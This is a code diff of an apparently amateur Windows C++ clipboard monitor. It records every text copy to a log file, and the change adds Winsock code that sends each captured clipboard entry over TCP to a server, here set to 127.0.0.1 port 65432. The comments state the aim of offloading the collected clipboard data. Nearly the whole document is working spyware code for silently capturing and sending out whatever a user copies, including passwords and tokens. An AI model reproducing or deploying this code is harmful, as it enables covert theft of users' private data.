@@ -1,39 +1,122 @@
+//These defines are needed to prevent winsock2 from calling window.h twice.
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+
 #include <Windows.h>
 #include <iostream>
 #include <fstream>
 #include <sstream>
 #include <string>
 #include <conio.h>
-#include<map>
+//Libraries below are needed for transmitting files to remote server.
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <stdio.h>
+#pragma comment(lib, "Ws2_32.lib")
+
+
 using namespace std;
 //create a stream to a file stored in the Logbook object
 string Logbook = "Log1.txt";
 ofstream Recorder(Logbook);
-//if visibility is set to 1 then it will not run in the background, if it was 0 then the program runs in the background
 
-map<int, string>Format_names = { {1,"CF_TEXT"},{2,"CF_BITMAP"},{3,"CF_METAFILEPICT"},{4,"CF_STLK"},{5,"CF_DIF"},{6,"CF_TIFF"},{7,"CF_OEMTEXT"},{8,"CF_DIB"},{9,"CF_PALETTE"}, {10,"CF_PENDATA"}, {11,"CF_RIFF"},{12,"CF_WAVE"},{13,"UNICODETEXT"}, {14,"CF_ENHMETAFILE"}, {15,"CF_HDROP"},{16,"CF_LOCALE"},{17,"CF_DIBV5"} };
-void Run_in_Background(int visibility) {
-	HWND window;
-	//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
-	window = FindWindowA("ConsoleWindowClass", NULL);
-	//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
-	ShowWindow(window, visibility);
-}
+// used for socket object
+
+
 
 int main() {
-	//run it in the background
-	Run_in_Background(1);
+	bool GoodSocket = true;
+	// This code is to connect to the remote server, to offload the data collected from the clipboard.
+	WSADATA wsaData;
+	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (iResult != 0) {
+		cout << "Wsastartup Failed.";
+		GoodSocket = false;
+	}
+
+
+	struct addrinfo* result = NULL,
+		* ptr = NULL,
+		hints;
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+#define DEFAULT_PORT "65432"
+
+	// Resolve the server address and port
+	iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
+	if (iResult != 0) {
+		printf("getaddrinfo failed: %d\n", iResult);
+		WSACleanup();
+		GoodSocket = false;
+	}
+
+	SOCKET ConnectSocket = INVALID_SOCKET;
+
+	// Attempt to connect to the first address returned by
+	// the call to getaddrinfo
+	ptr = result;
+
+	// Create a SOCKET for connecting to server
+	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
+		ptr->ai_protocol);
+
+	if (ConnectSocket == INVALID_SOCKET) {
+		printf("Error at socket(): %ld\n", WSAGetLastError());
+		freeaddrinfo(result);
+		WSACleanup();
+		GoodSocket = false;
+	}
+
+
+
+
+
+	// Connect to server.
+	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(ConnectSocket);
+		ConnectSocket = INVALID_SOCKET;
+	}
+
+	// Should really try the next address returned by getaddrinfo
+	// if the connect call failed
+	// But for this simple example we just free the resources
+	// returned by getaddrinfo and print an error message
+
+	freeaddrinfo(result);
+
+	if (ConnectSocket == INVALID_SOCKET) {
+		printf("Unable to connect to server!\n");
+		WSACleanup();
+		GoodSocket = false;
+	}
+#define DEFAULT_BUFLEN 1024
+
+	//This is a format example on how to send data to the server. To be deleted for release.
+	char* sendbuf;
+	
+
 	DWORD tOurSeq = -1;//our current count
 	while (1) {//continuously run
-		// get the clipboard count
+
+
+		// get the clipboard count, used to validate if the clipboard has been updated. https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardsequencenumber
 		DWORD ClipSeq = GetClipboardSequenceNumber();
 		//see if the clipboard and our count are the same to till if it change since our last count
 		bool same = (ClipSeq == tOurSeq);
 		//set our count to the clipboard count
 		tOurSeq = ClipSeq;
 
+
 		try {
 			//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardformatnamea#return-value
+			// Gathers the number of formats currently on clipboard https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-countclipboardformats
 			UINT formats = CountClipboardFormats();
 			UINT next_format = 0;
 			next_format = EnumClipboardFormats(next_format);
@@ -45,14 +128,13 @@ int main() {
 			bool UNICODETEXT = IsClipboardFormatAvailable(CF_UNICODETEXT);
 			bool Text = IsClipboardFormatAvailable(CF_TEXT);
 			bool TIFF = IsClipboardFormatAvailable(CF_TIFF);
+			
 			HANDLE in;
 			if (!same) {
 				std::cout << "==========================================================================================================================" << endl;
-				std::cout << "Format :" << Format_names.at(format) << " " <<"Sequence :"<<ClipSeq<< endl;
+				std::cout << "Format " << format << " " << endl;
 				Recorder << "==========================================================================================================================" << endl;
-				Recorder << "Format :" << Format_names.at(format) << " " << endl;
-				std::cout << "-------------------------------------------------------------------------------------------------------------------------" << endl;
-				Recorder << "-------------------------------------------------------------------------------------------------------------------------" << endl;
+				Recorder << "Format " << format << " " << endl;
 
 				switch (format) {
 					//Data type: ANSI text
@@ -65,6 +147,10 @@ int main() {
 					//using said text display it to the console and store into the Logbook
 					std::cout << (char*)in << endl;
 					Recorder << (char*)in << endl;
+					if (GoodSocket) {
+						sendbuf = (char*)in;
+						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+					}
 					CloseClipboard();
 					break;
 					//Data type:HBITMAP
@@ -84,7 +170,7 @@ int main() {
 				case 4:
 					break;
 					//Data type:ASCII Text
-					//Use Case:Software Arts Data Interchange Format
+					//Use Case:Software Arts Data Interchange Format 
 					//CF_Dif
 				case 5:
 					break;
@@ -103,6 +189,10 @@ int main() {
 					//using said text display it to the console and store into the Logbook
 					std::cout << (char*)in << endl;
 					Recorder << (char*)in << endl;
+					if (GoodSocket) {
+						sendbuf = (char*)in;
+						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+					}
 					CloseClipboard();
 					break;
 					//Data type:BITMAPINFO
@@ -140,6 +230,10 @@ int main() {
 					//using said text display it to the console and store into the Logbook
 					std::cout << (char*)in << endl;
 					Recorder << (char*)in << endl;
+					if (GoodSocket) {
+						sendbuf = (char*)in;
+						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+					}
 					CloseClipboard();
 					break;
 					//Data type:HENHMETAFILE
@@ -208,15 +302,26 @@ int main() {
 				case 0x02FF:
 					break;
 
+
 				default:
 					break;
 				}
+				if (iResult == SOCKET_ERROR) {
+					cout << "Send failed" << endl;
+					GoodSocket = false;
+					closesocket(ConnectSocket);
+					WSACleanup();
+				}
+
 			}
 		}
 
 		catch (exception e) {
-			cout << "Something went wrong with clipboard " << endl;
+			cout << "this is not text" << endl;
+
 		}
 	}
 	Recorder.close();
+	closesocket(ConnectSocket);
+	WSACleanup();
 }
